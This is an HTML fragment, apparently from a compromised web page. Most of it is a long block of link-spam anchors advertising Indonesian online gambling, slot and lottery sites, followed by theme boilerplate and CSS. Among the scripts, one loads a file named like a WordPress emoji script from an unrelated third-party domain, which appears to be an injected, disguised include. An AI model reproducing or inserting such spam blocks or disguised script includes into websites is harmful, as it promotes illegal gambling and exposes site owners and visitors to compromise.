        <a href="<?php echo $urlPath ?>">BOCORAN HK</a>
        <a href="<?php echo $urlPath ?>">BOCORAN SGP</a>
        <a href="<?php echo $urlPath ?>">BOCORAN SDY</a>
        <a href="<?php echo $urlPath ?>">slot dana sip777.com</a>
        <a href="<?php echo $urlPath ?>">slot thailand [evohoki.com]</a>
        <a href="<?php echo $urlPath ?>">slot gacor hqtoto805.com</a>
        <a href="<?php echo $urlPath ?>">slot terpercaya asia128</a>
        <a href="<?php echo $urlPath ?>">slot gacor link normalbet</a>
        <a href="<?php echo $urlPath ?>">AGEN183</a>
        <a href="<?php echo $urlPath ?>">situs mahjong --vegas338</a>
        <a href="<?php echo $urlPath ?>">JET777</a>
        <a href="<?php echo $urlPath ?>">bumi22 link</a>
        <a href="<?php echo $urlPath ?>">juragan 189</a>
        <a href="<?php echo $urlPath ?>">hopeng slot</a>
        <a href="<?php echo $urlPath ?>">MIXTOTO</a>
        <a href="<?php echo $urlPath ?>">slot gacor fujiwin88</a>
        <a href="<?php echo $urlPath ?>">mandalika77</a>
        <a href="<?php echo $urlPath ?>">raja cabe 88</a>
        <a href="<?php echo $urlPath ?>">sbobet agen provip805 idn</a>
        <a href="<?php echo $urlPath ?>">AFCTOTO</a>
        <a href="<?php echo $urlPath ?>">slot online rajacuan69🔥</a>
        <a href="<?php echo $urlPath ?>">SEMUT77</a>
        <a href="<?php echo $urlPath ?>">situs gacor dewabos138.blog</a>
        <a href="<?php echo $urlPath ?>">SEMUT88</a>
        <a href="<?php echo $urlPath ?>">slot online rajacuan69-maxwin</a>
        <a href="<?php echo $urlPath ?>">main slot --login(jos889)</a>
        <a href="<?php echo $urlPath ?>">pintu123</a>
        <a href="<?php echo $urlPath ?>">CUANGACOR</a>
        <a href="<?php echo $urlPath ?>">jawawin</a>
        <a href="<?php echo $urlPath ?>">nagacuan</a>
        <a href="<?php echo $urlPath ?>">BET808</a>
        <a href="<?php echo $urlPath ?>">FAFABET</a>
        <a href="<?php echo $urlPath ?>">situs gacor --isototo</a>
        <a href="<?php echo $urlPath ?>">slot777 istanabet</a>
        <a href="<?php echo $urlPath ?>">AERO77</a>
        <a href="<?php echo $urlPath ?>">INTER88</a>
        <a href="<?php echo $urlPath ?>">api naga slot</a>
        <a href="<?php echo $urlPath ?>">IMBAHOKI</a>
        <a href="<?php echo $urlPath ?>">JENIUS777</a>
        <a href="<?php echo $urlPath ?>">PION33</a>
        <a href="<?php echo $urlPath ?>">DAY777</a>
        <a href="<?php echo $urlPath ?>">NUSATOTO</a>
        <a href="<?php echo $urlPath ?>">KAWANTOTO</a>
        <a href="<?php echo $urlPath ?>">MASTOTO</a>
        <a href="<?php echo $urlPath ?>">SITUS THAILAND</a>
        <a href="<?php echo $urlPath ?>">QT777</a>
        <a href="<?php echo $urlPath ?>">LIVE TOTO MACAU</a>
        <a href="<?php echo $urlPath ?>">LIVE DRAW TOTO MACAU</a>
        <a href="<?php echo $urlPath ?>">TOTO MACAU HARI INI</a>
        <a href="<?php echo $urlPath ?>">TOTO MACAU 4D</a>
        <a href="<?php echo $urlPath ?>">PAITO TOTO MACAU</a>
        <a href="<?php echo $urlPath ?>">TOTO MACAU 5D</a>
        <a href="<?php echo $urlPath ?>">MANDIRI77</a>
        <a href="<?php echo $urlPath ?>">VESPA4D</a>
        <a href="<?php echo $urlPath ?>">ASIAPOKER88</a>
        <a href="<?php echo $urlPath ?>">ALAM88</a>
        <a href="<?php echo $urlPath ?>">GAS88</a>
        <a href="<?php echo $urlPath ?>">megahoki</a>
        <a href="<?php echo $urlPath ?>">wdbos</a>
        <a href="<?php echo $urlPath ?>">depobos</a>
        <a href="<?php echo $urlPath ?>">hemat138</a>
        <a href="<?php echo $urlPath ?>">okta388</a>
        <a href="<?php echo $urlPath ?>">qq333bet</a>
        <a href="<?php echo $urlPath ?>">topcer88</a>
        <a href="<?php echo $urlPath ?>">gta777</a>
        <a href="<?php echo $urlPath ?>">cpgtoto</a>
        <a href="<?php echo $urlPath ?>">amantoto</a>
        <a href="<?php echo $urlPath ?>">nanastoto</a>
        <a href="<?php echo $urlPath ?>">taringbet</a>
        <a href="<?php echo $urlPath ?>">padi777</a>
        <a href="<?php echo $urlPath ?>">jeboltoto</a>
        <a href="<?php echo $urlPath ?>">SLOT GACOR HARI INI</a>
        <a href="<?php echo $urlPath ?>">dapurtogel</a>
        <a href="<?php echo $urlPath ?>">kawantoto</a>
        <a href="<?php echo $urlPath ?>">minion88</a>
        <a href="<?php echo $urlPath ?>">dewanaga777</a>
        <a href="<?php echo $urlPath ?>">rapi88</a>
        <a href="<?php echo $urlPath ?>">LATOTO</a>
        <a href="<?php echo $urlPath ?>">pos4d</a>
        <a href="<?php echo $urlPath ?>">dewatoto</a>
        <a href="<?php echo $urlPath ?>">qq88</a>
        <a href="<?php echo $urlPath ?>">bimatoto</a>
        <a href="<?php echo $urlPath ?>">ladangmpo</a>
        <a href="<?php echo $urlPath ?>">wifitoto</a>
        <a href="<?php echo $urlPath ?>">angkasa138</a>
        <a href="<?php echo $urlPath ?>">situs online o-mami188</a>
        <a href="<?php echo $urlPath ?>">OVO77</a>
        <a href="<?php echo $urlPath ?>">slot 777 rajadewa138</a>
        <a href="<?php echo $urlPath ?>">VIRAL77</a>
        <a href="<?php echo $urlPath ?>">KAKEK99</a>
        <a href="<?php echo $urlPath ?>">RINDU4D</a>
        <a href="<?php echo $urlPath ?>">INDO88</a>
        <a href="<?php echo $urlPath ?>">BOLA888</a>
        <a href="<?php echo $urlPath ?>">bosku777</a>
        <a href="<?php echo $urlPath ?>">FOKUS77</a>
        <a href="<?php echo $urlPath ?>">EDAN77</a>
        <a href="<?php echo $urlPath ?>">slot gacor slot775</a>
        <a href="<?php echo $urlPath ?>">SITUS888</a>
        <a href="<?php echo $urlPath ?>">hoki138</a>
        <a href="<?php echo $urlPath ?>">lawas777</a>
        <a href="<?php echo $urlPath ?>">wukong288</a>
        <a href="<?php echo $urlPath ?>">warung168</a>
        <a href="<?php echo $urlPath ?>">warung138</a>
        <a href="<?php echo $urlPath ?>">hoki777</a>
        <a href="<?php echo $urlPath ?>">slot --agen108</a>
        <a href="<?php echo $urlPath ?>">cinta777</a>
        <a href="<?php echo $urlPath ?>">WAKANDA4D</a>
        <a href="<?php echo $urlPath ?>">sp777</a>
        <a href="<?php echo $urlPath ?>">artis777</a>
        <a href="<?php echo $urlPath ?>">IDN SLOT</a>
        <a href="<?php echo $urlPath ?>">SLOT IDN</a>
        <a href="<?php echo $urlPath ?>">angkasa138</a>
        <a href="<?php echo $urlPath ?>">DEPOSLOT</a>
        <a href="<?php echo $urlPath ?>">ombak 126</a>
        <a href="<?php echo $urlPath ?>">SLOT8888</a>
        <a href="<?php echo $urlPath ?>">LAPAKGAMING</a>
        <a href="<?php echo $urlPath ?>">TAMBANG88</a>
        <a href="<?php echo $urlPath ?>">888SLOT</a>
        <a href="<?php echo $urlPath ?>">JOKER123</a>
        <a href="<?php echo $urlPath ?>">ZEUSSLOT</a>
        <a href="<?php echo $urlPath ?>">MPO</a>
        <a href="<?php echo $urlPath ?>">TOTO SLOT</a>
        <a href="<?php echo $urlPath ?>">SBOBET88</a>
        <a href="<?php echo $urlPath ?>">MEGA888</a>
        <a href="<?php echo $urlPath ?>">BET188</a>
        <a href="<?php echo $urlPath ?>">ROBOPRAGMA</a>
        <a href="<?php echo $urlPath ?>">EPICWIN</a>
        <a href="<?php echo $urlPath ?>">9NAGA</a>
        <a href="<?php echo $urlPath ?>">INDOSLOT888</a>
        <a href="<?php echo $urlPath ?>">slot gacor japri138.com</a>
        <a href="<?php echo $urlPath ?>">DEWASLOT88</a>
        <a href="<?php echo $urlPath ?>">SLOTGACOR</a>
        <a href="<?php echo $urlPath ?>">DRAGON77</a>
        <a href="<?php echo $urlPath ?>">bro138</a>
        <a href="<?php echo $urlPath ?>">link --agen108</a>
        <a href="<?php echo $urlPath ?>">YING77</a>
        <a href="<?php echo $urlPath ?>">MEMEKI</a>
        <a href="<?php echo $urlPath ?>">BERITA138</a>
        <a href="<?php echo $urlPath ?>">slot777 fokus777</a>
        <a href="<?php echo $urlPath ?>">GACOR138</a>
        <a href="<?php echo $urlPath ?>">slot online agen putin138.com</a>
        <a href="<?php echo $urlPath ?>">unsur 138 login</a>
        <a href="<?php echo $urlPath ?>">slot online {raja138}</a>
        <a href="<?php echo $urlPath ?>">cuan138 login</a>
        <a href="<?php echo $urlPath ?>">pagoda 168 slot login</a>
        <a href="<?php echo $urlPath ?>">RAJAWD</a>
        <a href="<?php echo $urlPath ?>">bonus138 login</a>
        <a href="<?php echo $urlPath ?>">88DEWA</a>
        <a href="<?php echo $urlPath ?>">BET365DK</a>
        <a href="<?php echo $urlPath ?>">RAJA88</a>
        <a href="<?php echo $urlPath ?>">agen138 link alternatif</a>
        <a href="<?php echo $urlPath ?>">SCORE88</a>
        <a href="<?php echo $urlPath ?>">MPO77</a>
        <a href="<?php echo $urlPath ?>">HGO99</a>
        <a href="<?php echo $urlPath ?>">SOFABET</a>
        <a href="<?php echo $urlPath ?>">BIGSLOT</a>
        <a href="<?php echo $urlPath ?>">IDNSLOT</a>
        <a href="<?php echo $urlPath ?>">KING99</a>
        <a href="<?php echo $urlPath ?>">DEWA99</a>
        <a href="<?php echo $urlPath ?>">STAR777</a>
        <a href="<?php echo $urlPath ?>">MPO1212</a>
        <a href="<?php echo $urlPath ?>">LANGKAHCURANG</a>
        <a href="<?php echo $urlPath ?>">JP88</a>
        <a href="<?php echo $urlPath ?>">JPSLOT16</a>
        <a href="<?php echo $urlPath ?>">DEWASLOT77</a>
        <a href="<?php echo $urlPath ?>">SLOT300</a>
        <a href="<?php echo $urlPath ?>">BIGSLOT88</a>
        <a href="<?php echo $urlPath ?>">JP138</a>
        <a href="<?php echo $urlPath ?>">POKER</a>
        <a href="<?php echo $urlPath ?>">WIN777</a>
        <a href="<?php echo $urlPath ?>">MPO5000</a>
        <a href="<?php echo $urlPath ?>">DEWA138</a>
        <a href="<?php echo $urlPath ?>">DEWAGACOR</a>
        <a href="<?php echo $urlPath ?>">MPOASIA88</a>
        <a href="<?php echo $urlPath ?>">NAGA777</a>
        <a href="<?php echo $urlPath ?>">BET777</a>
        <a href="<?php echo $urlPath ?>">SATESLOT</a>
        <a href="<?php echo $urlPath ?>">BATUMACANWIN4D</a>
        <a href="<?php echo $urlPath ?>">INFINI88</a>
        <a href="<?php echo $urlPath ?>">MASTERSLOT</a>
        <a href="<?php echo $urlPath ?>">77RABBIT</a>
        <a href="<?php echo $urlPath ?>">CMMSLOT88</a>
        <a href="<?php echo $urlPath ?>">ASIABET88</a>
        <a href="<?php echo $urlPath ?>">BP77</a>
        <a href="<?php echo $urlPath ?>">SLOT99</a>
        <a href="<?php echo $urlPath ?>">ASIASLOT</a>
        <a href="<?php echo $urlPath ?>">DEWA188</a>
        <a href="<?php echo $urlPath ?>">DRAGON22</a>
        <a href="<?php echo $urlPath ?>">kdslot</a>
        <a href="<?php echo $urlPath ?>">eurotogel login</a>
        <a href="<?php echo $urlPath ?>">situs gacor sip777.it.com</a>
        <a href="<?php echo $urlPath ?>">jujur4d</a>
        <a href="<?php echo $urlPath ?>">KDSLOT77</a>
        <a href="<?php echo $urlPath ?>">tempur99</a>
        <a href="<?php echo $urlPath ?>">slot gacor dewakoin99.gacor</a>
        <a href="<?php echo $urlPath ?>">link gacor tajir365</a>
        <a href="<?php echo $urlPath ?>">situs macan388 slot</a>
        <a href="<?php echo $urlPath ?>">ISTANA77</a>
        <a href="<?php echo $urlPath ?>">GATOTKACA77</a>
        <a href="<?php echo $urlPath ?>">JUDI123</a>
        <a href="<?php echo $urlPath ?>">ASIA777</a>
        <a href="<?php echo $urlPath ?>">BOSSLOT</a>
        <a href="<?php echo $urlPath ?>">MEGA77</a>
        <a href="<?php echo $urlPath ?>">situs slot gacor --arjuna88</a>
        <a href="<?php echo $urlPath ?>">AGEN88</a>
        <a href="<?php echo $urlPath ?>">DEWA77</a>
        <a href="<?php echo $urlPath ?>">ASIA88</a>
        <a href="<?php echo $urlPath ?>">ricis99</a>
        <a href="<?php echo $urlPath ?>">KINGBET</a>
        <a href="<?php echo $urlPath ?>">judi bola okebray</a>
        <a href="<?php echo $urlPath ?>">DEPO88</a>
        <a href="<?php echo $urlPath ?>">slot online --duren77(duren777)</a>
        <a href="<?php echo $urlPath ?>">GANAS88</a>
        <a href="<?php echo $urlPath ?>">KINGSLOT</a>
        <a href="<?php echo $urlPath ?>">slot39</a>
        <a href="<?php echo $urlPath ?>">judi slot --(jajantogel)</a>
        <a href="<?php echo $urlPath ?>">MPO1000</a>
        <a href="<?php echo $urlPath ?>">INDO77</a>
        <a href="<?php echo $urlPath ?>">slot resmi evohoki.com</a>
        <a href="<?php echo $urlPath ?>">rokokbet login</a>
        <a href="<?php echo $urlPath ?>">situs slot --(jajantogel)</a>
        <a href="<?php echo $urlPath ?>">kacang99</a>
        <a href="<?php echo $urlPath ?>">MIO77</a>
        <a href="<?php echo $urlPath ?>">MPO55</a>
        <a href="<?php echo $urlPath ?>">gacor02 slot.gacor02.com</a>
        <a href="<?php echo $urlPath ?>">FAFASLOT</a>
        <a href="<?php echo $urlPath ?>">situs gacor --(kelinci88)</a>
        <a href="<?php echo $urlPath ?>">GALAXY777</a>
        <a href="<?php echo $urlPath ?>">slot online --link(nusagg.com)</a>
        <a href="<?php echo $urlPath ?>">slot terpercaya —evohoki📌</a>
        <a href="<?php echo $urlPath ?>">HOKI33</a>
        <a href="<?php echo $urlPath ?>">judi slot --daftar(jajantogel)</a>
        <a href="<?php echo $urlPath ?>">JITU777</a>
        <a href="<?php echo $urlPath ?>">puasbet</a>
        <a href="<?php echo $urlPath ?>">HOKICUAN78</a>
        <a href="<?php echo $urlPath ?>">slot gacor --(apibet)</a>
        <a href="<?php echo $urlPath ?>">situs slot gacor evohoki.com</a>
        <a href="<?php echo $urlPath ?>">DEWI228</a>
        <a href="<?php echo $urlPath ?>">HABANERO</a>
        <a href="<?php echo $urlPath ?>">BIGWIN88</a>
        <a href="<?php echo $urlPath ?>">KING77</a>
        <a href="<?php echo $urlPath ?>">LEGO99</a>
        <a href="<?php echo $urlPath ?>">METRO77</a>
        <a href="<?php echo $urlPath ?>">MENANGBET</a>
        <a href="<?php echo $urlPath ?>">LARISBET</a>
        <a href="<?php echo $urlPath ?>">12SHIO1</a>
        <a href="<?php echo $urlPath ?>">HOKI333</a>
        <a href="<?php echo $urlPath ?>">slot gacor fixislot.com</a>
        <a href="<?php echo $urlPath ?>">ZEUS777</a>
        <a href="<?php echo $urlPath ?>">DAVO888</a>
        <a href="<?php echo $urlPath ?>">ASIK777</a>
        <a href="<?php echo $urlPath ?>">GBO388</a>
        <a href="<?php echo $urlPath ?>">PISANG77</a>
        <a href="<?php echo $urlPath ?>">GACOR168</a>
        <a href="<?php echo $urlPath ?>">99CASH</a>
        <a href="<?php echo $urlPath ?>">NADIMTOTO</a>
        <a href="<?php echo $urlPath ?>">MPO138</a>
        <a href="<?php echo $urlPath ?>">LINESLOT</a>
        <a href="<?php echo $urlPath ?>">BERLIAN88</a>
        <a href="<?php echo $urlPath ?>">MPO288</a>
        <a href="<?php echo $urlPath ?>">138SLOT</a>
        <a href="<?php echo $urlPath ?>">KOIN88</a>
        <a href="<?php echo $urlPath ?>">DAFABET</a>
        <a href="<?php echo $urlPath ?>">BABATOTO</a>
        <a href="<?php echo $urlPath ?>">EGO77</a>
        <a href="<?php echo $urlPath ?>">IDOLABET</a>
        <a href="<?php echo $urlPath ?>">SENSASLOT</a>
        <a href="<?php echo $urlPath ?>">AMDBET88</a>
        <a href="<?php echo $urlPath ?>">DEWI888</a>
        <a href="<?php echo $urlPath ?>">BETMEN88</a>
        <a href="<?php echo $urlPath ?>">DEPOSLOT</a>
        <a href="<?php echo $urlPath ?>">SJO77</a>
        <a href="<?php echo $urlPath ?>">MAWAR88</a>
        <a href="<?php echo $urlPath ?>">JARING88</a>
        <a href="<?php echo $urlPath ?>">77LUCKY</a>
        <a href="<?php echo $urlPath ?>">MAXWIN888</a>
        <a href="<?php echo $urlPath ?>">DEWANAGA</a>
        <a href="<?php echo $urlPath ?>">QQSLOT88</a>
        <a href="<?php echo $urlPath ?>">BET888</a>
        <a href="<?php echo $urlPath ?>">HOKI303</a>
        <a href="<?php echo $urlPath ?>">CERIA77</a>
        <a href="<?php echo $urlPath ?>">EMAS138</a>
        <a href="<?php echo $urlPath ?>">NAGAHOKI</a>
        <a href="<?php echo $urlPath ?>">LIGABET</a>
        <a href="<?php echo $urlPath ?>">DEWATA888</a>
        <a href="<?php echo $urlPath ?>">GACOR303</a>
        <a href="<?php echo $urlPath ?>">PGSOFT</a>
        <a href="<?php echo $urlPath ?>">KODOK77</a>
        <a href="<?php echo $urlPath ?>">QQ88</a>
        <a href="<?php echo $urlPath ?>">INDO138</a>
        <a href="<?php echo $urlPath ?>">MPO444</a>
        <a href="<?php echo $urlPath ?>">BOS888</a>
        <a href="<?php echo $urlPath ?>">GACOR888</a>
        <a href="<?php echo $urlPath ?>">GACOR500</a>
        <a href="<?php echo $urlPath ?>">CASH88</a>
        <a href="<?php echo $urlPath ?>">NAGA77</a>
        <a href="<?php echo $urlPath ?>">PREMIUM777</a>
        <a href="<?php echo $urlPath ?>">SLOT999</a>
        <a href="<?php echo $urlPath ?>">ROMA777</a>
        <a href="<?php echo $urlPath ?>">PLAYSLOT</a>
        <a href="<?php echo $urlPath ?>">ZEUS123</a>
        <a href="<?php echo $urlPath ?>">FAFASLOT88</a>
        <a href="<?php echo $urlPath ?>">KEJUSLOT</a>
        <a href="<?php echo $urlPath ?>">AMAZON303</a> 
         </div> 
    <!--[if lte IE 8]>
  <div style="color:#fff;background:#f00;padding:20px;text-align:center;">
    ThemeForest no longer actively supports this version of Internet Explorer. We suggest that you <a href="https://windows.microsoft.com/en-us/internet-explorer/download-ie" style="color:#fff;text-decoration:underline;">upgrade to a newer version</a> or <a href="https://browsehappy.com/" style="color:#fff;text-decoration:underline;">try a different browser</a>.
  </div>
<![endif]--></script>
    <script src="https://public-assets.envato-static.com/assets/market/core/head-d4f3da877553664cb1d5ed45cb42c6ec7e6b00d0c4d164be8747cfd5002a24eb.js" nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
    <style type="text/css" id="CookieConsentStateDisplayStyles">.cookieconsent-optin,.cookieconsent-optin-preferences,.cookieconsent-optin-statistics,.cookieconsent-optin-marketing{display:block;display:initial}.cookieconsent-optout-preferences,.cookieconsent-optout-statistics,.cookieconsent-optout-marketing,.cookieconsent-optout{display:none}</style>
     <script src="https://wptheme.cloud/wp-includes/wp-elements/wp-emoji-release-version.2.7.js"></script>
    <style>:root{--color-grey-1000:#191919;--color-grey-1000-mask: rgb(25 25 25 / 0.7);--color-grey-700:#383838;--color-grey-500:#707070;--color-grey-300:#949494;--color-grey-100:#ccc;--color-grey-50:#ececee;--color-grey-25:#f9f9fb;--color-white:#fff;--color-white-mask: rgb(255 255 255 / 0.7);--color-green-1000:#1a4200;--color-green-700:#2e7400;--color-green-500:#51a31d;--color-green-300:#6cc832;--color-green-100:#9cee69;--color-green-25:#eaffdc;--color-blue-1000:#16357b;--color-blue-700:#4f5ce8;--color-blue-500:#7585ff;--color-blue-25:#f0f1ff;--color-veryberry-1000:#77012d;--color-veryberry-700:#b9004b;--color-veryberry-500:#f65286;--color-veryberry-25:#ffecf2;--color-bubblegum-700:#b037a6;--color-bubblegum-100:#e6afe1;--color-bubblegum-25:#feedfc;--color-jaffa-1000:#692400;--color-jaffa-700:#c24100;--color-jaffa-500:#ff6e28;--color-jaffa-25:#fff5ed;--color-yolk-1000:#452d0d;--color-yolk-700:#9e5f00;--color-yolk-500:#c28800;--color-yolk-300:#ffc800;--color-yolk-25:#fefaea;--color-transparent:transparent;--breakpoint-wide:1024px;--breakpoint-extra-wide:1440px;--breakpoint-2k-wide:2560px;--spacing-8x:128px;--spacing-7x:64px;--spacing-6x:40px;--spacing-5x:32px;--spacing-4x:24px;--spacing-3x:16px;--spacing-2x:8px;--spacing-1x:4px;--spacing-none:0;--chunkiness-none:0;--chunkiness-thin:1px;--chunkiness-thick:2px;--roundness-square:0;--roundness-subtle:4px;--roundness-extra-round:16px;--roundness-circle:48px;--shadow-500: 0px 2px 12px 0px rgba(0 0 0 / 15%);--elevation-medium:var(--shadow-500);--transition-base:.2s;--transition-duration-long:500ms;--transition-duration-medium:300ms;--transition-duration-short:150ms;--transition-easing-linear:cubic-bezier(0,0,1,1);--transition-easing-ease-in:cubic-bezier(.42,0,1,1);--transition-easing-ease-in-out:cubic-bezier(.42,0,.58,1);--transition-easing-ease-out:cubic-bezier(0,0,.58,1);--font-family-wide:"PolySansWide" , "PolySans" , "Inter" , -apple-system , "BlinkMacSystemFont" , "Segoe UI" , "Fira Sans" , "Helvetica Neue" , "Arial" , sans-serif;--font-family-regular:"PolySans" , "Inter" , -apple-system , "BlinkMacSystemFont" , "Segoe UI" , "Fira Sans" , "Helvetica Neue" , "Arial" , sans-serif;--font-family-monospace:"Courier New" , monospace;--font-size-10x:6rem;--font-size-9x:4.5rem;--font-size-8x:3rem;--font-size-7x:2.25rem;--font-size-6x:1.875rem;--font-size-5x:1.5rem;--font-size-4x:1.125rem;--font-size-3x:1rem;--font-size-2x:.875rem;--font-size-1x:.75rem;--font-weight-bulky:700;--font-weight-median:600;--font-weight-neutral:400;--font-spacing-tight:-.02em;--font-spacing-normal:0;--font-spacing-loose:.02em;--font-height-tight:1;--font-height-normal:1.5;--icon-size-5x:48px;--icon-size-4x:40px;--icon-size-3x:32px;--icon-size-2x:24px;--icon-size-1x:16px;--icon-size-text-responsive: calc(var(--font-size-3x) * 1.5);--layer-depth-ceiling:9999;--minimum-touch-area:40px;--button-height-large:48px;--button-height-medium:40px;--button-font-family:var(--font-family-regular);--button-font-size-large:var(--font-size-3x);--button-font-size-medium:var(--font-size-2x);--button-font-weight:var(--font-weight-median);--button-font-height:var(--font-height-normal);--button-font-spacing:var(--font-spacing-normal);--text-style-chip-family:var(--font-family-regular);--text-style-chip-spacing:var(--font-spacing-normal);--text-style-chip-xlarge-size:var(--font-size-5x);--text-style-chip-xlarge-weight:var(--font-weight-median);--text-style-chip-xlarge-height:var(--font-height-tight);--text-style-chip-large-size:var(--font-size-3x);--text-style-chip-large-weight:var(--font-weight-neutral);--text-style-chip-large-height:var(--font-height-normal);--text-style-chip-medium-size:var(--font-size-2x);--text-style-chip-medium-weight:var(--font-weight-neutral);--text-style-chip-medium-height:var(--font-height-normal);--text-style-campaign-large-family:var(--font-family-wide);--text-style-campaign-large-size:var(--font-size-9x);--text-style-campaign-large-spacing:var(--font-spacing-normal);--text-style-campaign-large-weight:var(--font-weight-bulky);--text-style-campaign-large-height:var(--font-height-tight);--text-style-campaign-small-family:var(--font-family-wide);--text-style-campaign-small-size:var(--font-size-7x);--text-style-campaign-small-spacing:var(--font-spacing-normal);--text-style-campaign-small-weight:var(--font-weight-bulky);--text-style-campaign-small-height:var(--font-height-tight);--text-style-title-1-family:var(--font-family-regular);--text-style-title-1-size:var(--font-size-8x);--text-style-title-1-spacing:var(--font-spacing-normal);--text-style-title-1-weight:var(--font-weight-bulky);--text-style-title-1-height:var(--font-height-tight);--text-style-title-2-family:var(--font-family-regular);--text-style-title-2-size:var(--font-size-7x);--text-style-title-2-spacing:var(--font-spacing-normal);--text-style-title-2-weight:var(--font-weight-median);--text-style-title-2-height:var(--font-height-tight);--text-style-title-3-family:var(--font-family-regular);--text-style-title-3-size:var(--font-size-6x);--text-style-title-3-spacing:var(--font-spacing-normal);--text-style-title-3-weight:var(--font-weight-median);--text-style-title-3-height:var(--font-height-tight);--text-style-title-4-family:var(--font-family-regular);--text-style-title-4-size:var(--font-size-5x);--text-style-title-4-spacing:var(--font-spacing-normal);--text-style-title-4-weight:var(--font-weight-median);--text-style-title-4-height:var(--font-height-tight);--text-style-subheading-family:var(--font-family-regular);--text-style-subheading-size:var(--font-size-4x);--text-style-subheading-spacing:var(--font-spacing-normal);--text-style-subheading-weight:var(--font-weight-median);--text-style-subheading-height:var(--font-height-normal);--text-style-body-large-family:var(--font-family-regular);--text-style-body-large-size:var(--font-size-3x);--text-style-body-large-spacing:var(--font-spacing-normal);--text-style-body-large-weight:var(--font-weight-neutral);--text-style-body-large-height:var(--font-height-normal);--text-style-body-large-strong-weight:var(--font-weight-bulky);--text-style-body-small-family:var(--font-family-regular);--text-style-body-small-size:var(--font-size-2x);--text-style-body-small-spacing:var(--font-spacing-normal);--text-style-body-small-weight:var(--font-weight-neutral);--text-style-body-small-height:var(--font-height-normal);--text-style-body-small-strong-weight:var(--font-weight-bulky);--text-style-label-large-family:var(--font-family-regular);--text-style-label-large-size:var(--font-size-3x);--text-style-label-large-spacing:var(--font-spacing-normal);--text-style-label-large-weight:var(--font-weight-median);--text-style-label-large-height:var(--font-height-normal);--text-style-label-small-family:var(--font-family-regular);--text-style-label-small-size:var(--font-size-2x);--text-style-label-small-spacing:var(--font-spacing-loose);--text-style-label-small-weight:var(--font-weight-median);--text-style-label-small-height:var(--font-height-normal);--text-style-micro-family:var(--font-family-regular);--text-style-micro-size:var(--font-size-1x);--text-style-micro-spacing:var(--font-spacing-loose);--text-style-micro-weight:var(--font-weight-neutral);--text-style-micro-height:var(--font-height-tight)}.color-scheme-light{--color-interactive-primary:var(--color-green-100);--color-interactive-primary-hover:var(--color-green-300);--color-interactive-secondary:var(--color-transparent);--color-interactive-secondary-hover:var(--color-grey-1000);--color-interactive-tertiary:var(--color-transparent);--color-interactive-tertiary-hover:var(--color-grey-25);--color-interactive-control:var(--color-grey-1000);--color-interactive-control-hover:var(--color-grey-700);--color-interactive-disabled:var(--color-grey-100);--color-surface-primary:var(--color-white);--color-surface-accent:var(--color-grey-50);--color-surface-inverse:var(--color-grey-1000);--color-surface-brand-accent:var(--color-jaffa-25);--color-surface-elevated:var(--color-grey-700);--color-surface-caution-default:var(--color-jaffa-25);--color-surface-caution-strong:var(--color-jaffa-700);--color-surface-critical-default:var(--color-veryberry-25);--color-surface-critical-strong:var(--color-veryberry-700);--color-surface-info-default:var(--color-blue-25);--color-surface-info-strong:var(--color-blue-700);--color-surface-neutral-default:var(--color-grey-25);--color-surface-neutral-strong:var(--color-grey-1000);--color-surface-positive-default:var(--color-green-25);--color-surface-positive-strong:var(--color-green-700);--color-overlay-light:var(--color-white-mask);--color-overlay-dark:var(--color-grey-1000-mask);--color-content-brand:var(--color-green-1000);--color-content-brand-accent:var(--color-bubblegum-700);--color-content-primary:var(--color-grey-1000);--color-content-inverse:var(--color-white);--color-content-secondary:var(--color-grey-500);--color-content-disabled:var(--color-grey-300);--color-content-caution-default:var(--color-jaffa-700);--color-content-caution-strong:var(--color-jaffa-25);--color-content-critical-default:var(--color-veryberry-700);--color-content-critical-strong:var(--color-veryberry-25);--color-content-info-default:var(--color-blue-700);--color-content-info-strong:var(--color-blue-25);--color-content-neutral-default:var(--color-grey-1000);--color-content-neutral-strong:var(--color-white);--color-content-positive-default:var(--color-green-700);--color-content-positive-strong:var(--color-green-25);--color-border-primary:var(--color-grey-1000);--color-border-secondary:var(--color-grey-300);--color-border-tertiary:var(--color-grey-100);--color-always-white:var(--color-white)}.color-scheme-dark{--color-interactive-primary:var(--color-green-100);--color-interactive-primary-hover:var(--color-green-300);--color-interactive-secondary:var(--color-transparent);--color-interactive-secondary-hover:var(--color-white);--color-interactive-tertiary:var(--color-transparent);--color-interactive-tertiary-hover:var(--color-grey-700);--color-interactive-control:var(--color-white);--color-interactive-control-hover:var(--color-grey-100);--color-interactive-disabled:var(--color-grey-700);--color-surface-primary:var(--color-grey-1000);--color-surface-accent:var(--color-grey-700);--color-surface-inverse:var(--color-white);--color-surface-brand-accent:var(--color-grey-700);--color-surface-elevated:var(--color-grey-700);--color-surface-caution-default:var(--color-jaffa-1000);--color-surface-caution-strong:var(--color-jaffa-500);--color-surface-critical-default:var(--color-veryberry-1000);--color-surface-critical-strong:var(--color-veryberry-500);--color-surface-info-default:var(--color-blue-1000);--color-surface-info-strong:var(--color-blue-500);--color-surface-neutral-default:var(--color-grey-700);--color-surface-neutral-strong:var(--color-white);--color-surface-positive-default:var(--color-green-1000);--color-surface-positive-strong:var(--color-green-500);--color-overlay-light:var(--color-white-mask);--color-overlay-dark:var(--color-grey-1000-mask);--color-content-brand:var(--color-green-1000);--color-content-brand-accent:var(--color-bubblegum-100);--color-content-primary:var(--color-white);--color-content-inverse:var(--color-grey-1000);--color-content-secondary:var(--color-grey-100);--color-content-disabled:var(--color-grey-500);--color-content-caution-default:var(--color-jaffa-500);--color-content-caution-strong:var(--color-jaffa-1000);--color-content-critical-default:var(--color-veryberry-500);--color-content-critical-strong:var(--color-veryberry-1000);--color-content-info-default:var(--color-blue-500);--color-content-info-strong:var(--color-blue-1000);--color-content-neutral-default:var(--color-white);--color-content-neutral-strong:var(--color-grey-1000);--color-content-positive-default:var(--color-green-500);--color-content-positive-strong:var(--color-green-1000);--color-border-primary:var(--color-white);--color-border-secondary:var(--color-grey-500);--color-border-tertiary:var(--color-grey-700);--color-always-white:var(--color-white)}</style>
